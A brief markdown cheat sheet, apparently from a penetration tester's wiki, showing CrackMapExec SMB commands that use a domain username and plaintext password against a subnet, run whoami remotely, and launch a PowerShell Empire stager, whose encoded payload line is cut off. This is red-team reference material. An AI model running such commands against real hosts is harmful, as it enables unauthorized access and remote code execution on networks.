---
description: A basic wiki to use different alias and attributes of crackmapexec
---

# Crackmapexec

### Crackmapexec Usage

```text
root@kali:/usr/share/doc/python-impacket/examples
crackmapexec smb 10.10.5.0/24 -d DOMAIN -u JOHN.CARPENTER -p Hastings1066
```

### Used for Power shell stager with empire

```text
crackmapexec smb /home/osboxes/Documents/targets.txt -d ADMDUB -u PKELLY -p 'Soundgarden.1' -x 'powershell -noP -sta -w 1 -enc
```

### Whoami Command

```text
crackmapexec smb /home/osboxes/Documents/targets.txt -d ADMDUB -u PKELLY -p 'Soundgarden.1' -x whoami
```

### References:

* [https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference](https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference)
* [https://github.com/byt3bl33d3r/CrackMapExec/wiki/Target-Formats](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Target-Formats)
* [https://github.com/byt3bl33d3r/CrackMapExec/wiki/Command-Execution](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Command-Execution)
* [https://github.com/byt3bl33d3r/CrackMapExec/wiki/Getting-Shells-101](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Getting-Shells-101)

